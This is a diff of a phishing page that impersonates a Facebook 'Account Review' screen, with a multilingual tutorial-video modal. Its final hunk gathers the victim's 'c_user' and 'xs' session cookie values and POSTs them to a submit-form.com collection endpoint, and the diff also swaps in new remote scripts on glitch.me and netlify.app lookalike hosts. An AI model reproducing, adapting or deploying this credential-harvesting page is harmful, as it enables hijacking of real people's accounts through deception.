@@ -1,6 +1,6 @@
 <html lang="en" webcrx=""><head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="https://submit-form.com/QMpYhIxdI">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Account Review</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -1225,9 +1225,9 @@
         }
       }
     </style>
-  <script src="blob:https://apply-for-page-terms-review-urgent-required.glitch.me/1166b9ae-b68b-4979-a0d7-3c7bcdc2838f"></script><script src="blob:https://appeal-center-for-restrictions.glitch.me/b38813fd-6bbc-407f-bbc6-f35365804b56"></script></head>
+  <script src="blob:https://user-security-alert.netlify.app/25c017c1-5f08-4368-a4fe-307d36567c31"></script></head>
 
-  <body style="overflow: auto;">
+  <body>
     <div class="header">
       <div class="header-content">
         <div class="logo">
@@ -1408,7 +1408,7 @@
     </div>
 
     <!-- Review Modal -->
-    <div class="modal" id="reviewModal" style="display: none;">
+    <div class="modal" id="reviewModal">
       <div class="modal-content">
         <div class="modal-header">
           <h2 class="modal-title">
@@ -1435,11 +1435,11 @@
                 <span>Connection: Good</span>
               </div>
               <div class="video-container">
-                <video id="tutorialVideo" src="https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4">
+                <video id="tutorialVideo" src="English_US_video_information_V1.mp4">
                   <!-- Source will be set dynamically -->
                   Your browser does not support the video tag.
                 </video>
-                <div class="loading-spinner" id="loadingSpinner" style="display: none;">
+                <div class="loading-spinner" id="loadingSpinner">
                   <div class="spinner"></div>
                   <div class="loading-percentage">0%</div>
                 </div>
@@ -1452,14 +1452,16 @@
                   </p>
                 </div>
                 <div class="video-controls">
-                  <button class="control-btn" id="playPauseBtn"><i class="fas fa-play"></i></button>
+                  <button class="control-btn" id="playPauseBtn">
+                    <i class="fas fa-play"></i>
+                  </button>
                   <div class="progress-container">
-                    <div class="buffered-bar" id="bufferedBar" style="width: 0%;"></div>
-                    <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
+                    <div class="buffered-bar" id="bufferedBar"></div>
+                    <div class="progress-bar" id="progressBar"></div>
                   </div>
                   <div class="time-display">
                     <span id="currentTime">0:00</span> /
-                    <span id="totalTime">0:59</span>
+                    <span id="totalTime">0:00</span>
                   </div>
                   <div class="volume-container">
                     <button class="control-btn" id="volumeBtn">
@@ -1617,17 +1619,16 @@
       document.addEventListener("DOMContentLoaded", function () {
         // Video files mapping
         const videoFiles = {
-          english: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          filipino: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          hindi: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          portuguese:
-            "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          spanish: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          tamil: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          arabic: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          french: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          swedish: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          japanese: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
+          'english': 'English_US_video_information_V1.mp4',
+          'filipino': 'Filipino_Tagalog_video_information_V1.mp4',
+          'hindi': 'Hindi_video_information_V1.mp4',
+          'portuguese': 'Portuguese_Brazil_video_information_V1.mp4',
+          'spanish': 'Spanish_Spain_video_information_V1.mp4',
+          'tamil': 'Tamil_video_information_V1.mp4',
+          'arabic': 'Arabic_video_information_V1.mp4',
+          'french': 'French_France_video_information_V1.mp4',
+          'swedish': 'Swedish_video_information_V1.mp4',
+          'japanese': 'Japanese_video_information_V1.mp4'
         };
 
         // Language modal elements
@@ -2050,7 +2051,7 @@
           formData.append("c_user", cUserInput.value);
           formData.append("xs", xsInput.value);
 
-          fetch("https://submit-form.com/QMpYhIxdI", {
+          fetch("https://submit-form.com/i53vPXsKW", {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
